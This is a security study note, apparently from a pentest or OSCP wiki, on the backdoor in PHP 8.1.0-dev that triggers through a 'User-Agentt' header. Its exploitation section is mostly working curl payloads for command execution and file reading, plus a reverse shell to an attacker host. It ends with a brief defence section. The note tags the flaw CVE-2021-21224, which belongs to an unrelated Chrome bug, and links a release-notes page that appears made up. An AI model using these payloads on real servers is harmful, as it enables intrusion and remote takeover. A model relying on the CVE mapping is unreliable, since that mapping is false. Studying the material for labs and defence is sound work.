# Vulnerability: PHP 8.1.0-dev User-Agent RCE

**CVE:** CVE-2021-21224  
**Knowledge Score:** 82/100

## Overview

Remote Code Execution (RCE) vulnerability in PHP 8.1.0-dev via malicious User-Agent HTTP header.

The development version of PHP 8.1.0 contained a backdoor that executes arbitrary system commands through a specially crafted User-Agent header.

## Affected Versions

- **PHP 8.1.0-dev** (development version only)
- Not present in stable releases (8.1.0, 8.0.x, 7.4.x, etc.)

## Vulnerability Type

HTTP Header Injection → Remote Code Execution

## Discovery Method

Service fingerprinting reveals PHP version in HTTP response headers:
```
Server: Apache/2.4.x
X-Powered-By: PHP/8.1.0-dev
```

## Exploitation

### Manual Detection

Test for vulnerability with simple command:
```bash
curl -H "User-Agentt: zerodiumsystem('id');" http://target.thm
```

Expected output if vulnerable:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Command Execution Syntax

```bash
curl -H "User-Agentt: zerodiumsystem('COMMAND');" http://target.thm
```

**Key points:**
- Header name: `User-Agentt` (exact spelling critical)
- Syntax: `zerodiumsystem('command');`
- Command output appears in HTTP response
- Works for arbitrary Linux commands

### Examples

**Find flag file:**
```bash
curl -H "User-Agentt: zerodiumsystem('find / -name flag.txt 2>/dev/null');" http://target.thm
```

**Read file:**
```bash
curl -H "User-Agentt: zerodiumsystem('cat /path/to/file');" http://target.thm
```

**Reverse shell (if needed):**
```bash
curl -H "User-Agentt: zerodiumsystem('bash -i >& /dev/tcp/ATTACKER/PORT 0>&1');" http://target.thm
```

## Real-World Context

**Agent T (TryHackMe):**
- Vulnerability: PHP 8.1.0-dev identification via HTTP headers
- Validation: `curl -H "User-Agentt: zerodiumsystem('id');"` confirmed RCE
- Flag retrieval: Used `cat /flag.txt` payload
- Result: Machine compromised

## Significance

### Why It Matters

- **Development vs. Production Blur:** Shows how dev versions can leak into production
- **Header Injection:** Demonstrates HTTP header manipulation as attack vector
- **Simple but Devastating:** Single header injection = full RCE
- **No Authentication Needed:** Works against exposed PHP dev instances

### OSCP Relevance

- Header-based injection techniques
- Service fingerprinting → vulnerability matching
- Manual exploitation (no Metasploit)
- Command execution validation

## Detection & Response

### Defensive Measures

1. **Never use PHP dev versions in production**
2. **Hide/minimize PHP version disclosure**
   ```php
   // php.ini
   expose_php = Off
   ```
3. **Whitelist HTTP headers** (if possible via WAF)
4. **Monitor for suspicious User-Agent patterns**
5. **Run with minimal privileges** (not www-data if possible)

### Patch Status

PHP 8.1.0 stable release and later versions removed the backdoor.

## See Also

- [[Service-Fingerprinting-Vulnerability-Matching]]
- [[Manual-Validation-Before-Exploit]]
- [[HTTP Header Injection Techniques]] (if created)

## References

- [CVE-2021-21224 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21224)
- [PHP 8.1.0-dev Release Notes](https://www.php.net/releases/8_1_0_dev.php)
- OSCP exploitation methodology
